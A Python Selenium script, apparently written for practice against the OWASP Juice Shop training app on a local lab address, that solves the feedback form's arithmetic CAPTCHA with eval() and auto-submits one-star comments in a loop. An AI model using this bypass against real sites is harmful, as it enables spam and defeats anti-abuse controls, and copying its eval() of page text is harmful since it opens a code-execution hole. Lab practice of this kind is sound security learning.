#Python3 script that takes advantage of the broken anti-automation
#in Owasp juice shop Feedback.
#A simple automation script that allows captcha to be bypassed and comments
#automatically inserted.

#Prereq: Firefox, geckodriver, selenium and python3

#How to use?:
#After prereqs are satisfied, just run the script in the terminal.
#eg, python3 captchaVuln2.py

#Author:Fadleen Sidek
#Date: 04 Feb 2021
#Version:0.2

#--------------------------------------------------------------#

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.keys import Keys
import requests
#from requests_toolbelt.utils import dump
#import json
import time
import datetime

#https://stackoverflow.com/questions/18719980/proxy-selenium-python-firefox/31086235
#configure burpsuite to capture selenium based tests

proxy = "127.0.0.1:8080"					#must be the same in burpsuite
firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX
firefox_capabilities['marionette'] = True

firefox_capabilities['proxy'] = {
		"proxyType": "MANUAL",
		"httpProxy": proxy,
		"ftpProxy": proxy,
		"sslProxy": proxy
		}

#a very big function :)
def automateComment():
	#just print a simple timestamp with the comments
	myComment = '{:%d-%m-%Y %H:%M:%S}'.format(datetime.datetime.now())

	#driver = webdriver.Firefox(capabilities=firefox_capabilities)
	driver = webdriver.Firefox()
	driver.get("http://192.168.56.246/#/contact")

	#simulate click to remove the welcome banner
	btn = driver.find_element(By.XPATH, "//span[text()='Dismiss']")
	btn.click()

	#extract the captcha by id from Inspector
	readCaptchaText = driver.find_element_by_id('captcha').text
	print(readCaptchaText)
	answer = eval(readCaptchaText)
	print(answer)

	#fill in the textbox with the calculated captcha
	#https://stackoverflow.com/questions/35136773/setattribute-method-for-webelement
	#https://www.w3schools.com/tags/tag_input.asp
	tbInput = driver.find_element_by_id('captchaControl')
	tbInput.click()
	driver.execute_script("arguments[0].setAttribute(arguments[1],arguments[2]);",tbInput,"type","text")
	driver.execute_script("arguments[0].value = arguments[1];",tbInput,answer)
	#time.sleep(1)
	tbInput.click()
	tbInput.send_keys("4")
	time.sleep(1)
	tbInput.send_keys(Keys.BACK_SPACE)

	#simulate a 1 star click
	star = driver.find_element(By.XPATH,"//div[@class='br-unit ng-star-inserted']")
	star.click()

	#fill in the comments
	commentBox = driver.find_element_by_id('comment')
	time.sleep(1)
	commentBox.click()
	#driver.execute_script("arguments[0].setAttribute(arguments[1],arguments[2]);",commentBox,"disabled","false")
	driver.execute_script("arguments[0].value = arguments[1];",commentBox,"Hello Planet! Time now is  " + myComment)
	time.sleep(1)
	commentBox.click()
	commentBox.send_keys("4")
	#time.sleep(1)
	commentBox.send_keys(Keys.BACK_SPACE)

	#wait for the force reload page to go off as it is blocking the submit button
	time.sleep(2)

	#click on the submit button
	#https://stackoverflow.com/questions/26566799/wait-until-page-is-loaded-with-selenium-webdriver-for-python
	WebDriverWait(driver, 1000000).until(EC.element_to_be_clickable((By.XPATH, "//button[@id='submitButton']"))).click()

	#end automation and close firefox
	time.sleep(1)
	driver.quit()

#how many times to automate the comments can be entered in the range
for i in range(2):
	automateComment()

